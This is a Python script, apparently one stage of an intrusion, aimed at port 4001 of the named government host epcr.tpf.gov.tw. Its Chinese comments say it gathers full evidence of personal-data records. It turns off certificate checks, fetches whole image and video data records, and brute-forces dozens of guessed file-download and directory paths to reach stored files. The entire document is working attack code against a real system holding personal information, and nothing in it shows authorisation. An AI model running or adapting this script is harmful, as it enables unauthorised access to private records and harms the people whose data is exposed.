#!/usr/bin/env python3
"""Phase 5: :4001 单条 PII 完整证据 + /getFile 文件下载探测"""
import http.client, ssl, json
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def req(host, port, method, path, body=None, headers=None, timeout=15, proto='https'):
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}
    if headers: h.update(headers)
    cn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout) if proto=='https' else http.client.HTTPConnection(host, port, timeout=timeout)
    cn.request(method, path, body=body, headers=h)
    r = cn.getresponse()
    rb = r.read()
    rh = dict(r.getheaders())
    cn.close()
    return r.status, rb, rh

# 1. :4001 /imageData/2 单条（id=2 是第一条实际记录）
print("="*80)
print("Phase 5-1: :4001 /imageData/2 单条")
print("="*80)
s, b, _ = req('epcr.tpf.gov.tw', 4001, 'GET', '/imageData/2', timeout=15)
print(f"GET /imageData/2 → status={s}  body FULL ({len(b)} bytes):")
print(b.decode('utf-8', errors='replace'))

print()
print("="*80)
print("Phase 5-2: :4001 /videoData/2 单条")
print("="*80)
s, b, _ = req('epcr.tpf.gov.tw', 4001, 'GET', '/videoData/2', timeout=15)
print(f"GET /videoData/2 → status={s}  body FULL ({len(b)} bytes):")
print(b.decode('utf-8', errors='replace'))

# 2. :4001 文件下载路径探测
print()
print("="*80)
print("Phase 5-3: :4001 文件下载端点探测")
print("="*80)
for path in [
    '/getFile/63',
    '/getFile/63.svg',
    '/getFile/imageData/2',
    '/getFile/2',
    '/fileData/2',
    '/download/2',
    '/files/63',
    '/getFile?fileId=63',
    '/getFile?fileName=180816115714c890.svg',
    '/getFile?fileName=test1808113701.svg',
    '/api/file/63',
    '/file/63',
    '/imageData/2/file',
    '/videoData/2/file',
    '/imageData/2/download',
    '/imageData/download?fileId=63',
    '/imageData/download?fileName=test1808113701.svg',
    '/images/63',
    '/images/test1808113701.svg',
]:
    try:
        s, b, _ = req('epcr.tpf.gov.tw', 4001, 'GET', path, timeout=10)
        print(f"  GET {path:50s} → status={s}  body[:100]={b[:100]!r}")
    except Exception as e:
        print(f"  GET {path:50s} → ERROR {type(e).__name__}")

# 3. :4001 /getFile 公开端点探测（videos 和 images 路径）
print()
print("="*80)
print("Phase 5-4: :4001 /videos /images /uploads 公开目录探测")
print("="*80)
for path in [
    '/videos', '/videos/', '/images', '/images/', '/uploads', '/uploads/',
    '/uploads/images', '/uploads/videos', '/public', '/public/',
    '/files', '/files/', '/static', '/static/', '/assets', '/assets/',
    '/media', '/media/',
    # 已知 fileId 63, 106, 107 测试
    '/getFile?fileId=106', '/getFile?fileId=107', '/getFile?fileId=110',
]:
    try:
        s, b, _ = req('epcr.tpf.gov.tw', 4001, 'GET', path, timeout=10)
        print(f"  GET {path:50s} → status={s}  body[:80]={b[:80]!r}")
    except Exception as e:
        print(f"  GET {path:50s} → ERROR {type(e).__name__}")

